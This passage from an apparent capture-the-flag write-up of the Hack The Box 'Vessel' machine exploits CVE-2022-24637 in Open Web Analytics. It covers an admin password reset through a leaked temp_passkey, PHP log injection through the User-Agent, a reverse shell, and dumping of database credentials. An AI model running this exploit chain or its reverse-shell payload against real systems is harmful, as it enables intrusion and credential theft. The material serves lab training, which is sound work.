class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>As stated in the blog post, it’s the <strong>temp_passkey</strong> <code>cc25c639f4395109e0381784b7ec840e</code> that can be userd to set a new password for the admin account.</p>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>Keep building on the script with the blog post as reference and I’m easily able to decode the base64 blob, capture the <code>temp_passkey</code> value and change the password for user admin.</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel python3 vessel.py <span class="at">-t</span> http://openwebanalytics.vessel.htb <span class="at">-u</span> admin <span class="at">-p</span> exploit.se</span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> generationg cache file</span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> admin cache found!</span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> extracted temp_passkey: 30e22a1a269d2a65534054bda6ea971b</span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> changed admin password to: exploit.se</span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> admin login successful</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We’re now able to login to the service using <code>admin:exploit.se</code> and within we find the directory path:</p>
<p><img src="images/vessel08.png" class="img-fluid"></p>
<p>Testing to update a value from “On” to “Off” we se all variables used in the POST request:</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode html code-with-copy"><code class="sourceCode html"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>POST /index.php?owa_do=base.optionsGeneral HTTP/1.1</span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>Host: openwebanalytics.vessel.htb</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>Accept-Language: en-US,en;q=0.5</span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>Accept-Encoding: gzip, deflate</span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>Content-Type: application/x-www-form-urlencoded</span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>Content-Length: 772</span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>Origin: http://openwebanalytics.vessel.htb</span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>Connection: close</span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral</span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>Cookie: owa_passwordSession=c825d3ad67e8ba16dc4f57ddd662a2d296801b6e67017ad76e85350e1ed5ff62; owa_userSession=admin; owa_userSession=admin; owa_passwordSession=49639afc7e742a04d65be47b4eb2ddc2cf0ecb181eddd4151f37e117e280c750</span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>Upgrade-Insecure-Requests: 1</span>
<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a>owa_config%5Bbase.resolve_hosts%5D=0<span class="er">&amp;</span>owa_config%5Bbase.log_feedreaders%5D=1<span class="er">&amp;</span>owa_config%5Bbase.log_robots%5D=0<span class="er">&amp;</span>owa_config%5Bbase.log_named_users%5D=1<span class="er">&amp;</span>owa_config%5Bbase.excluded_ips%5D=%2C<span class="er">&amp;</span>owa_config%5Bbase.anonymize_ips%5D=0<span class="er">&amp;</span>owa_config%5Bbase.fetch_refering_page_info%5D=1<span class="er">&amp;</span>owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM<span class="er">&amp;</span>owa_config%5Bbase.query_string_filters%5D=%2C<span class="er">&amp;</span>owa_config%5Bbase.announce_visitors%5D=0<span class="er">&amp;</span>owa_config%5Bbase.notice_email%5D=admin%40vessel.htb<span class="er">&amp;</span>owa_config%5Bbase.geolocation_lookup%5D=1<span class="er">&amp;</span>owa_config%5Bbase.track_feed_links%5D=1<span class="er">&amp;</span>owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F<span class="er">&amp;</span>owa_config%5Bbase.timezone%5D=America%2FLos_Angeles<span class="er">&amp;</span>owa_nonce=ac9b9a2272<span class="er">&amp;</span>owa_action=base.optionsUpdate<span class="er">&amp;</span>owa_module=base</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>To update the log settings we need to figure out how to dynamically get the <code>owa_nonce</code> value and path to log directory. Luckily this is just as easy as doing a GET request:</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> updateLog(target):</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Update log to prepare for malicious payload</span></span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>    url <span class="op">=</span> target <span class="op">+</span> <span class="st">"/index.php?owa_do=base.optionsGeneral"</span></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>    get_data <span class="op">=</span> r.get(url).text</span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>    nonce <span class="op">=</span> re.search(<span class="vs">r'</span><span class="ch">\"</span><span class="vs">owa_nonce</span><span class="ch">\"</span><span class="vs"> value</span><span class="ch">\=\"</span><span class="kw">(</span><span class="dv">.</span><span class="op">*?</span><span class="kw">)</span><span class="ch">\"\&gt;</span><span class="vs">'</span>, get_data).group(<span class="dv">1</span>)</span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>    log_dir <span class="op">=</span> re.search(<span class="vs">r'</span><span class="ch">\"</span><span class="vs">owa_config</span><span class="ch">\[</span><span class="vs">base</span><span class="dv">.</span><span class="vs">async_log_dir</span><span class="ch">\]\"</span><span class="vs"> value</span><span class="ch">\=\"</span><span class="kw">(</span><span class="dv">.</span><span class="op">*?</span><span class="kw">)</span><span class="ch">\"\&gt;</span><span class="vs">'</span>, get_data).group(<span class="dv">1</span>) </span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] extracted nonce:"</span>, nonce)</span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] extracted log_dir:"</span>, log_dir)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel python3 vessel.py <span class="at">-t</span> http://openwebanalytics.vessel.htb <span class="at">-u</span> admin <span class="at">-p</span> asdf123</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> extracted nonce: ac9b9a2272</span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> extracted log_dir: /var/www/html/owa/owa-data/logs/</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>We can now change the log level and log file to <code>.php</code>, to and from here be able to do a log injection to execute php code and get a reverse shell.</p>
<p>The log injection is executed through the <code>User Agent</code> as we controll this variable and can easily verify that it’s reflected:</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel curl http://openwebanalytics.vessel.htb/owa-data/logs/rev.php</span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[debug_log]</span> Request URL:GET / 06:08:36 2022-08-30 3856 </span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[debug_log]</span> User Agent: ASDF THIS IS A TEST AGENT 06:08:36 2022-08-30 3856 </span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[debug_log]</span> Host: openwebanalytics.vessel.htb 06:08:36 2022-08-30 3856</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel python3 cve-2022-24637.py <span class="at">-t</span> http://openwebanalytics.vessel.htb <span class="at">-u</span> admin <span class="at">-p</span> exploit.se</span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>   <span class="ex">______</span>     _______     ____   ___ ____  ____      ____  _  _    __  __________ </span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>  <span class="ex">/</span> ___<span class="dt">\ \ </span>  / / ____<span class="kw">|</span>   <span class="kw">|</span><span class="ex">___</span> <span class="dt">\ </span>/ _ <span class="dt">\_</span>__ <span class="dt">\|</span>___ <span class="dt">\ </span>   <span class="kw">|</span><span class="ex">___</span> <span class="dt">\|</span> <span class="kw">||</span> <span class="kw">|</span>  <span class="ex">/</span> /_<span class="kw">|</span><span class="ex">___</span> /___  <span class="kw">|</span></span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a> <span class="kw">|</span> <span class="kw">|</span>    <span class="ex">\ \ /</span> /<span class="kw">|</span>  <span class="ex">_</span><span class="kw">|</span> <span class="ex">_____</span> __<span class="er">)</span> <span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span><span class="ex">__</span><span class="er">)</span> <span class="kw">|</span> <span class="ex">__</span><span class="er">)</span> <span class="kw">|</span><span class="ex">____</span> __<span class="er">)</span> <span class="kw">|</span> <span class="kw">||</span> <span class="kw">|</span><span class="ex">_</span><span class="kw">|</span> <span class="st">'_ \ |_ \  / / </span></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="st"> | |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/|__   _| (_) |__) |/ /  </span></span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="st">  \____|  \_/  |_____|   |_____|\___/_____|_____|   |_____|  |_|  \___/____//_/   </span></span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="st">                            by 0xPThree - exploit.se</span></span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a><span class="st">[&gt;] PART 1: SINGLE / DOUBLE QUOTE CONFUSION</span></span>
<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a><span class="st">[+] generationg cache file</span></span>
<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a><span class="st">[+] admin cache found!</span></span>
<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a><span class="st">[+] extracted temp_passkey: 19f5058761ee001e3addb0d3ad400da8</span></span>
<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a><span class="st">[+] changed admin password to: exploit.se</span></span>
<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a><span class="st">[+] admin login successful</span></span>
<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a><span class="st">[&gt;] PART 2: PHP FILE WRITE</span></span>
<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a><span class="st">[+] extracted nonce: 6d6ed4fecf</span></span>
<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a><span class="st">[+] extracted log_dir: /var/www/html/owa/owa-data/logs/</span></span>
<span id="cb17-21"><a href="#cb17-21" aria-hidden="true" tabindex="-1"></a><span class="st">[+] updated log settings</span></span>
<span id="cb17-22"><a href="#cb17-22" aria-hidden="true" tabindex="-1"></a><span class="st">[+] wrote payload to file: http://openwebanalytics.vessel.htb/owa-data/logs/rev.php</span></span>
<span id="cb17-23"><a href="#cb17-23" aria-hidden="true" tabindex="-1"></a><span class="st">[&gt;] triggering payload</span></span>
<span id="cb17-24"><a href="#cb17-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-25"><a href="#cb17-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-26"><a href="#cb17-26" aria-hidden="true" tabindex="-1"></a><span class="st">➜  vessel nc -lvnp 4488                                                              </span></span>
<span id="cb17-27"><a href="#cb17-27" aria-hidden="true" tabindex="-1"></a><span class="st">listening on [any] 4488 ...</span></span>
<span id="cb17-28"><a href="#cb17-28" aria-hidden="true" tabindex="-1"></a><span class="st">connect to [10.10.14.4] from (UNKNOWN) [10.10.11.178] 49452</span></span>
<span id="cb17-29"><a href="#cb17-29" aria-hidden="true" tabindex="-1"></a><span class="st">bash: cannot set terminal process group (1005): Inappropriate ioctl for device</span></span>
<span id="cb17-30"><a href="#cb17-30" aria-hidden="true" tabindex="-1"></a><span class="st">bash: no job control in this shell</span></span>
<span id="cb17-31"><a href="#cb17-31" aria-hidden="true" tabindex="-1"></a><span class="st">www-data@vessel:/var/www/html/owa/owa-data/logs$ id &amp;&amp; hostname</span></span>
<span id="cb17-32"><a href="#cb17-32" aria-hidden="true" tabindex="-1"></a><span class="st">id &amp;&amp; hostname</span></span>
<span id="cb17-33"><a href="#cb17-33" aria-hidden="true" tabindex="-1"></a><span class="st">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span>
<span id="cb17-34"><a href="#cb17-34" aria-hidden="true" tabindex="-1"></a><span class="st">vessel</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Download my <strong>CVE-2022-24637</strong> script <a href="../../assets/scripts/vessel_cve-2022-24637.py">HERE</a>.</p>
<p><strong>NOTE:</strong> The script won’t take into account if the php cache file already exists, if that’s the case it will print <em>“admin login successful”</em> at the start even though it isnt. I’m to lazy to fix this, even though it’s solved with a simple if-statement.</p>
<p><img src="images/vessel09.png" class="img-fluid"></p>
</section>
<section id="step-5" class="level3">
<h3 class="anchored" data-anchor-id="step-5">Step 5</h3>
<p>Enumerate the box manually and we find..</p>
<p>.. <strong>mysql</strong> credentials and data:</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/$</span> cat /var/www/html/owa/owa-config.php</span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="ex">define</span><span class="er">(</span><span class="st">'OWA_DB_TYPE'</span><span class="ex">,</span> <span class="st">'mysql'</span><span class="kw">);</span> <span class="ex">//</span> options: mysql</span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="ex">define</span><span class="er">(</span><span class="st">'OWA_DB_NAME'</span><span class="ex">,</span> <span class="st">'owa'</span><span class="kw">);</span> <span class="ex">//</span> name of the database</span>
<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="ex">define</span><span class="er">(</span><span class="st">'OWA_DB_HOST'</span><span class="ex">,</span> <span class="st">'localhost'</span><span class="kw">);</span> <span class="ex">//</span> host name of the server housing the database</span>
<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a><span class="ex">define</span><span class="er">(</span><span class="st">'OWA_DB_USER'</span><span class="ex">,</span> <span class="st">'owauser'</span><span class="kw">);</span> <span class="ex">//</span> database user</span>
<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="ex">define</span><span class="er">(</span><span class="st">'OWA_DB_PORT'</span><span class="ex">,</span> <span class="st">'3306'</span><span class="kw">);</span> <span class="ex">//</span> port of database</span>
<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="ex">define</span><span class="er">(</span><span class="st">'OWA_DB_PASSWORD'</span><span class="ex">,</span> <span class="st">'Vux8*ZF3rek94%NW'</span><span class="kw">);</span> <span class="ex">//</span> database users password</span>
<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/var/www/html/vessel/vessel/config$</span> cat db.js</span>
<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a><span class="ex">var</span> connection = {</span>
<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">db:</span> {</span>
<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">host</span>     : <span class="st">'localhost'</span>,</span>
<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a>    <span class="ex">user</span>     : <span class="st">'default'</span>,</span>
<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a>    <span class="ex">password</span> : <span class="st">'daqvACHKvRn84VdVp'</span>,</span>
<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a>    <span class="ex">database</span> : <span class="st">'vessel'</span></span>
<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/var/www/html/owa/owa-data/logs$</span> netstat <span class="at">-tulpn</span></span>
<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a><span class="ex">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name            </span>
<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:33060         0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:3306          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>       </span>
<span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/var/www/html/owa/owa-data/logs$</span> mysql owa <span class="at">-u</span> owauser <span class="at">-p</span></span>
<span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> password: Vux8<span class="pp">*</span>ZF3rek94%NW</span>
<span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span><span class="op">&gt;</span> use owa<span class="kw">;</span></span>
<span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span><span class="op">&gt;</span> select <span class="pp">*</span> from owa_user<span class="kw">;</span></span>
<span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+</span></span>
<span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">id</span> <span class="kw">|</span> <span class="ex">user_id</span> <span class="kw">|</span> <span class="ex">password</span>                                                     <span class="kw">|</span> <span class="ex">role</span>  <span class="kw">|</span> <span class="ex">real_name</span>     <span class="kw">|</span> <span class="ex">email_address</span>    <span class="kw">|</span> <span class="ex">temp_passkey</span>                     <span class="kw">|</span> <span class="ex">creation_date</span> <span class="kw">|</span> <span class="ex">last_update_date</span> <span class="kw">|</span> <span class="ex">api_key</span>                          <span class="kw">|</span></span>
<span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+</span></span>
<span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>  <span class="ex">1</span> <span class="kw">|</span> <span class="ex">admin</span>   <span class="kw">|</span> <span class="va">$2</span><span class="ex">y</span><span class="va">$1</span><span class="ex">0</span><span class="va">$4</span><span class="ex">0VVeZjtIFp7QY9FByW.y.wkTFkcEcOEmEPjpVbGbdxMIUbfKzc96</span> <span class="kw">|</span> <span class="ex">admin</span> <span class="kw">|</span> <span class="ex">default</span> admin <span class="kw">|</span> <span class="ex">admin@vessel.htb</span> <span class="kw">|</span> <span class="ex">a48f104f6f995e9655fe771a039666ad</span> <span class="kw">|</span>    <span class="ex">1650211659</span> <span class="kw">|</span>       <span class="ex">1650211659</span> <span class="kw">|</span> <span class="ex">a390cc0247ecada9a2b8d2338b9ca6d2</span> <span class="kw">|</span></span>
<span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+</span></span>
<span id="cb18-35"><a href="#cb18-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-36"><a href="#cb18-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-37"><a href="#cb18-37" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/var/www/html/owa/owa-data/logs$</span> mysql <span class="at">-D</span> vessel <span class="at">-u</span> default <span class="at">-p</span></span>
<span id="cb18-38"><a href="#cb18-38" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> password: daqvACHKvRn84VdVp</span>
<span id="cb18-39"><a href="#cb18-39" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span><span class="op">&gt;</span> use vessel<span class="kw">;</span></span>
<span id="cb18-40"><a href="#cb18-40" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span><span class="op">&gt;</span> select <span class="pp">*</span> from accounts<span class="kw">;</span></span>
<span id="cb18-41"><a href="#cb18-41" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+----------+----------------------------------+------------------+</span></span>
<span id="cb18-42"><a href="#cb18-42" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">id</span> <span class="kw">|</span> <span class="ex">username</span> <span class="kw">|</span> <span class="ex">password</span>                         <span class="kw">|</span> <span class="ex">email</span>            <span class="kw">|</span></span>
<span id="cb18-43"><a href="#cb18-43" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+----------+----------------------------------+------------------+</span></span>
<span id="cb18-44"><a href="#cb18-44" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>  <span class="ex">1</span> <span class="kw">|</span> <span class="ex">admin</span>    <span class="kw">|</span> <span class="ex">k</span><span class="op">&gt;</span>N4Hf6TmHE<span class="er">(</span><span class="ex">W]Uq</span><span class="st">"(RCj}V&gt;&amp;=rB</span><span class="va">$4</span><span class="st">}&lt; | admin@vessel.htb |</span></span>
<span id="cb18-45"><a href="#cb18-45" aria-hidden="true" tabindex="-1"></a><span class="st">+----+----------+----------------------------------+------------------+</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>.. read/execute privileges in user <code>steven</code>’s home directory:</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/home$</span> ls <span class="at">-al</span></span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-al</span></span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 16</span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>  4 root   root   4096 Aug 11 14:43 .</span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 19 root   root   4096 Aug 11 14:43 ..</span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a><span class="ex">drwx------</span>  5 ethan  ethan  4096 Aug 11 14:43 ethan</span>
<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>  3 steven steven 4096 Aug 11 14:43 steven</span>
<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/home$</span> ls <span class="at">-al</span> steven    </span>
<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 33796</span>
<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span> 3 steven steven     4096 Aug 11 14:43 .</span>
<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 4 root   root       4096 Aug 11 14:43 ..</span>
<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwxrwxrwx</span> 1 root   root          9 Apr 18 14:45 .bash_history <span class="at">-</span><span class="op">&gt;</span> /dev/null</span>
<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span> 1 steven steven      220 Apr 17 18:38 .bash_logout</span>
<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span> 1 steven steven     3771 Apr 17 18:38 .bashrc</span>
<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 2 ethan  steven     4096 Aug 11 14:43 .notes</span>
<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span> 1 steven steven      807 Apr 17 18:38 .profile</span>
<span id="cb19-18"><a href="#cb19-18" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 ethan  steven 34578147 May  4 11:03 passwordGenerator</span>
<span id="cb19-19"><a href="#cb19-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-20"><a href="#cb19-20" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/home/steven$</span> file passwordGenerator</span>
<span id="cb19-21"><a href="#cb19-21" aria-hidden="true" tabindex="-1"></a><span class="ex">passwordGenerator:</span> PE32 executable <span class="er">(</span><span class="ex">console</span><span class="kw">)</span> <span class="ex">Intel</span> 80386, for MS Windows</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>.. two files in the <code>.notes</code> directory. Download and analyze them:</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/home/steven/.notes$</span> ls <span class="at">-al</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-al</span></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 40</span>
